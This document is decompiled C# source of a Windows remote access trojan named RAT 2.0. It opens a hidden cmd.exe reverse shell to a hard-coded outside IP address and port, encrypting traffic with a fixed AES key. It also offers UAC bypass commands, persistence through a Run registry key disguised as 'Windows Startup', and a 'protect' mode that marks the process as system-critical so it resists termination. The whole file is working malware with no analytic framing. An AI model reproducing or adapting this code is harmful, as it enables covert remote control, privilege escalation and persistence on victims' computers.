using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;
using RAT_2._0.Exploits;

namespace RAT_2._0
{
	// Token: 0x02000002 RID: 2
	public partial class Form1 : Form
	{
		// Token: 0x06000001 RID: 1 RVA: 0x00002050 File Offset: 0x00000250
		public Form1()
		{
			this.InitializeComponent();
		}

		// Token: 0x06000002 RID: 2 RVA: 0x00002068 File Offset: 0x00000268
		private void Form1_Load(object sender, EventArgs e)
		{
			SystemEvents.SessionEnding += Form1.SystemEvents_SessionEnding;
			Form1.server = new Thread(new ThreadStart(Form1.Server_Connection));
			Form1.server.Start();
			while (Form1.disconnect)
			{
				Thread.Sleep(500);
			}
			Form1.server.Abort();
			Application.Exit();
		}

		// Token: 0x06000003 RID: 3 RVA: 0x000020D4 File Offset: 0x000002D4
		public static void Server_Connection()
		{
			while (Form1.disconnect)
			{
				try
				{
					using (TcpClient tcpClient = new TcpClient("18.223.41.243", 27023))
					{
						using (StreamReader streamReader = new StreamReader(tcpClient.GetStream()))
						{
							using (Form1.sw = new StreamWriter(tcpClient.GetStream()))
							{
								using (Process process = new Process())
								{
									process.StartInfo.FileName = "cmd.exe";
									process.StartInfo.CreateNoWindow = true;
									process.StartInfo.UseShellExecute = false;
									process.StartInfo.RedirectStandardOutput = true;
									process.StartInfo.RedirectStandardInput = true;
									process.StartInfo.RedirectStandardError = true;
									process.OutputDataReceived += Form1.CmdOutputDataHandler;
									process.Start();
									process.BeginOutputReadLine();
									Thread.Sleep(500);
									while (Form1.disconnect)
									{
										Form1.sw.AutoFlush = true;
										while (Form1.disconnect)
										{
											string text = streamReader.ReadLine();
											string text2 = "";
											try
											{
												text2 = Form1.Decrypt(text, Form1.key);
											}
											catch (Exception)
											{
												Form1.sw.WriteLine("Please use the AES encryption to send messages");
											}
											bool flag = text2 != "";
											if (flag)
											{
												bool flag2 = text2.StartsWith("uac");
												if (flag2)
												{
													int num = int.Parse(text2.Split(new char[]
													{
														' '
													})[1]);
													int num2 = num;
													int num3 = num2;
													if (num3 == 1)
													{
														Bypass.Method_1();
														Form1.sw.WriteLine(Form1.Encrypt("[+] Bypass Run", Form1.key));
														Form1.disconnect = false;
														throw new Exception();
													}
													if (num3 == 2)
													{
														Bypass.Method_2();
														Form1.sw.WriteLine(Form1.Encrypt("[+] Bypass Run", Form1.key));
														Form1.disconnect = false;
														throw new Exception();
													}
													Form1.sw.WriteLine(Form1.Encrypt("They are 2 methods please enter 1 or 2", Form1.key));
												}
												else
												{
													bool flag3 = text2 == "protect";
													if (flag3)
													{
														bool flag4 = Bypass.RunAsAdmin();
														if (flag4)
														{
															bool isProtected = Form1.IsProtected;
															if (isProtected)
															{
																Form1.Unprotect();
																Form1.sw.WriteLine(Form1.Encrypt("[+] Process Unprotected", Form1.key));
															}
															else
															{
																Form1.Protect();
																Form1.sw.WriteLine(Form1.Encrypt("[+] Process Protected", Form1.key));
															}
														}
														else
														{
															Form1.sw.WriteLine(Form1.Encrypt("[-] Unable To Protect Process Because Your Not Admin", Form1.key));
														}
													}
													else
													{
														bool flag5 = text2 == "admin";
														if (flag5)
														{
															Form1.sw.WriteLine(Form1.Encrypt(string.Format("IsAdmin: {0}", Bypass.RunAsAdmin()), Form1.key));
														}
														else
														{
															bool flag6 = text2 == "install";
															if (flag6)
															{
																try
																{
																	bool flag7 = !Form1.CheckInstall();
																	if (flag7)
																	{
																		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", RegistryKeyPermissionCheck.ReadWriteSubTree);
																		registryKey.SetValue("Windows Startup", Process.GetCurrentProcess().MainModule.FileName);
																		Form1.sw.WriteLine(Form1.Encrypt("[+] Installed", Form1.key));
																	}
																	else
																	{
																		RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", RegistryKeyPermissionCheck.ReadWriteSubTree);
																		registryKey2.DeleteValue("Windows Startup");
																		registryKey2.SetValue("Windows Startup", Process.GetCurrentProcess().MainModule.FileName);
																		Form1.sw.WriteLine(Form1.Encrypt("[+] Installed", Form1.key));
																	}
																}
																catch (Exception)
																{
																	Form1.sw.WriteLine(Form1.Encrypt("[-] Failed To Install", Form1.key));
																}
															}
															else
															{
																process.StandardInput.WriteLine(text2);
															}
														}
													}
												}
											}
										}
									}
								}
							}
						}
					}
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x06000004 RID: 4 RVA: 0x000025B8 File Offset: 0x000007B8
		public static bool CheckInstall()
		{
			bool result;
			try
			{
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", RegistryKeyPermissionCheck.ReadWriteSubTree);
				string value = (string)registryKey.GetValue("Windows Startup");
				bool flag = string.IsNullOrEmpty(value);
				if (flag)
				{
					result = false;
				}
				else
				{
					result = true;
				}
			}
			catch (Exception)
			{
				result = false;
			}
			return result;
		}

		// Token: 0x06000005 RID: 5 RVA: 0x00002614 File Offset: 0x00000814
		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
		{
			StringBuilder stringBuilder = new StringBuilder();
			Thread.Sleep(10);
			bool flag = !string.IsNullOrEmpty(outLine.Data);
			if (flag)
			{
				try
				{
					stringBuilder.Append(outLine.Data);
					string value = Form1.Encrypt(outLine.Data, Form1.key);
					Form1.sw.WriteLine(value);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x06000006 RID: 6 RVA: 0x00002688 File Offset: 0x00000888
		public static string Encrypt(string text, string key_)
		{
			byte[] bytes = Encoding.UTF8.GetBytes(text);
			AesCryptoServiceProvider aesCryptoServiceProvider = new AesCryptoServiceProvider();
			byte[] iv = new byte[]
			{
				23,
				29,
				49,
				100,
				233,
				47,
				10,
				49,
				50,
				28,
				54,
				72,
				58,
				10,
				9,
				34
			};
			aesCryptoServiceProvider.IV = iv;
			aesCryptoServiceProvider.Key = Form1.GetHashSha256(key_);
			aesCryptoServiceProvider.Mode = CipherMode.ECB;
			aesCryptoServiceProvider.Padding = PaddingMode.PKCS7;
			ICryptoTransform cryptoTransform = aesCryptoServiceProvider.CreateEncryptor();
			byte[] inArray = cryptoTransform.TransformFinalBlock(bytes, 0, bytes.Length);
			aesCryptoServiceProvider.Clear();
			return Convert.ToBase64String(inArray);
		}

		// Token: 0x06000007 RID: 7 RVA: 0x00002708 File Offset: 0x00000908
		public static byte[] GetHashSha256(string text)
		{
			byte[] bytes = Encoding.Unicode.GetBytes(text);
			SHA256Managed sha256Managed = new SHA256Managed();
			return sha256Managed.ComputeHash(bytes);
		}

		// Token: 0x06000008 RID: 8 RVA: 0x00002738 File Offset: 0x00000938
		public static string Decrypt(string text, string key_)
		{
			byte[] array = Convert.FromBase64String(text);
			AesCryptoServiceProvider aesCryptoServiceProvider = new AesCryptoServiceProvider();
			byte[] iv = new byte[]
			{
				23,
				29,
				49,
				100,
				233,
				47,
				10,
				49,
				50,
				28,
				54,
				72,
				58,
				10,
				9,
				34
			};
			aesCryptoServiceProvider.IV = iv;
			aesCryptoServiceProvider.Key = Form1.GetHashSha256(key_);
			aesCryptoServiceProvider.Mode = CipherMode.ECB;
			aesCryptoServiceProvider.Padding = PaddingMode.PKCS7;
			ICryptoTransform cryptoTransform = aesCryptoServiceProvider.CreateDecryptor();
			byte[] bytes = cryptoTransform.TransformFinalBlock(array, 0, array.Length);
			return Encoding.UTF8.GetString(bytes);
		}

		// Token: 0x06000009 RID: 9 RVA: 0x000027B1 File Offset: 0x000009B1
		protected override void OnClosing(CancelEventArgs e)
		{
			Form1.server.Abort();
			base.OnClosing(e);
		}

		// Token: 0x0600000A RID: 10
		[DllImport("ntdll.dll", SetLastError = true)]
		private static extern void RtlSetProcessIsCritical(uint v1, uint v2, uint v3);

		// Token: 0x17000001 RID: 1
		// (get) Token: 0x0600000B RID: 11 RVA: 0x000027C8 File Offset: 0x000009C8
		public static bool IsProtected
		{
			get
			{
				bool result;
				try
				{
					Form1.s_isProtectedLock.EnterReadLock();
					result = Form1.s_isProtected;
				}
				finally
				{
					Form1.s_isProtectedLock.ExitReadLock();
				}
				return result;
			}
		}

		// Token: 0x0600000C RID: 12 RVA: 0x0000280C File Offset: 0x00000A0C
		public static void Protect()
		{
			try
			{
				Form1.s_isProtectedLock.EnterWriteLock();
				bool flag = !Form1.s_isProtected;
				if (flag)
				{
					Process.EnterDebugMode();
					Form1.RtlSetProcessIsCritical(1U, 0U, 0U);
					Form1.s_isProtected = true;
				}
			}
			finally
			{
				Form1.s_isProtectedLock.ExitWriteLock();
			}
		}

		// Token: 0x0600000D RID: 13 RVA: 0x00002870 File Offset: 0x00000A70
		public static void Unprotect()
		{
			try
			{
				Form1.s_isProtectedLock.EnterWriteLock();
				bool flag = Form1.s_isProtected;
				if (flag)
				{
					Form1.RtlSetProcessIsCritical(0U, 0U, 0U);
					Form1.s_isProtected = false;
				}
			}
			finally
			{
				Form1.s_isProtectedLock.ExitWriteLock();
			}
		}

		// Token: 0x0600000E RID: 14 RVA: 0x000028CC File Offset: 0x00000ACC
		private static void SystemEvents_SessionEnding(object sender, SessionEndingEventArgs e)
		{
			SessionEndReasons reason = e.Reason;
			SessionEndReasons sessionEndReasons = reason;
			if (sessionEndReasons != SessionEndReasons.Logoff)
			{
				if (sessionEndReasons == SessionEndReasons.SystemShutdown)
				{
					try
					{
						Form1.Unprotect();
					}
					catch (Exception)
					{
					}
				}
			}
			else
			{
				try
				{
					Form1.Unprotect();
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x04000001 RID: 1
		public static string key = "iamthewolf";

		// Token: 0x04000002 RID: 2
		public static Thread server;

		// Token: 0x04000003 RID: 3
		public static StreamWriter sw;

		// Token: 0x04000004 RID: 4
		public static bool disconnect = true;

		// Token: 0x04000005 RID: 5
		private static volatile bool s_isProtected = false;

		// Token: 0x04000006 RID: 6
		private static ReaderWriterLockSlim s_isProtectedLock = new ReaderWriterLockSlim();
	}
}
